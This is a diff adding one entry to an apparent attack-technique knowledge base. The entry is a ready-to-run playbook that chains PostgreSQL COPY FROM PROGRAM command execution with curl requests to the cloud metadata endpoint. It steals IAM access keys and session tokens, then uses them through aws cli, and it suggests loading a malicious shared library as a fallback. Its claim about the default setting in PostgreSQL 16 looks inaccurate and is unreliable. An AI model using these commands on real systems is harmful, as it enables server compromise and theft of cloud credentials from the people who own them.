@@ -52,5 +52,28 @@
     "tags": ["azure", "imds", "managed-identity", "credential-theft", "cloud"],
     "confidence": 0.85,
     "mitre_attack": "T1525"
+  },
+  {
+    "id": "cloud-metadata-004",
+    "category": "EXPLOIT",
+    "subcategory": "CLOUD",
+    "title": "PostgreSQL COPY FROM PROGRAM Chained with IMDS Credential Theft",
+    "description": "PostgreSQL's COPY ... FROM PROGRAM clause executes arbitrary OS commands as the database system user (typically postgres). When the database runs on a cloud VM with IMDS access, this becomes a bridge to cloud credential theft. Attack: (1) Connect to PostgreSQL with superuser or pg_execute_server_program privilege: psql -h HOST -U postgres -d postgres. (2) Create a table to capture output: CREATE TABLE cmd_output (output text);. (3) Execute command via COPY: COPY cmd_output FROM PROGRAM 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/';. (4) Read the output: SELECT * FROM cmd_output; — this reveals the IAM role name. (5) Extract credentials: DROP TABLE cmd_output; CREATE TABLE cmd_output (output text); COPY cmd_output FROM PROGRAM 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME'; SELECT * FROM cmd_output; — this returns AccessKeyId, SecretAccessKey, Token. (6) Use credentials with aws_cli: export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...; aws sts get-caller-identity; aws s3 ls. (7) If the PostgreSQL user is not superuser, check for pg_read_server_files, pg_write_server_files, or pg_execute_server_program privileges that may allow the technique. (8) Alternative: if COPY FROM PROGRAM is blocked by SELinux or PostgreSQL config, try using PostgreSQL extension loading (CREATE EXTENSION) to load a malicious .so file.",
+    "techniques": [
+      "Connect to PostgreSQL: psql -h HOST -p PORT -U postgres -d postgres",
+      "Check permissions: SELECT current_user, usesuper FROM pg_user WHERE usename = current_user;",
+      "Create capture table: CREATE TABLE cmd_output (output text);",
+      "Execute via COPY: COPY cmd_output FROM PROGRAM 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/';",
+      "Read output: SELECT * FROM cmd_output;",
+      "Extract credentials: COPY cmd_output FROM PROGRAM 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE'; SELECT * FROM cmd_output;",
+      "Use credentials: export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...",
+      "Verify: aws sts get-caller-identity"
+    ],
+    "indicators": ["PostgreSQL running on cloud VM (EC2, Azure VM, GCE)", "PostgreSQL superuser or pg_execute_server_program privilege", "IMDS endpoint reachable from DB host", "COPY FROM PROGRAM not disabled (default enabled in PostgreSQL < 16)"],
+    "prerequisites": ["PostgreSQL connection with superuser or COPY privilege", "Database running on cloud infrastructure with IMDS", "Network path from DB to IMDS (169.254.169.254)", "psql client or connection string"],
+    "tools": ["psql_query", "aws_cli", "check_cloud_metadata"],
+    "tags": ["postgresql", "copy-from-program", "imds", "cloud", "credentials", "rds", "ec2", "database-escape"],
+    "confidence": 0.85,
+    "mitre_attack": "T1522"
   }
 ]
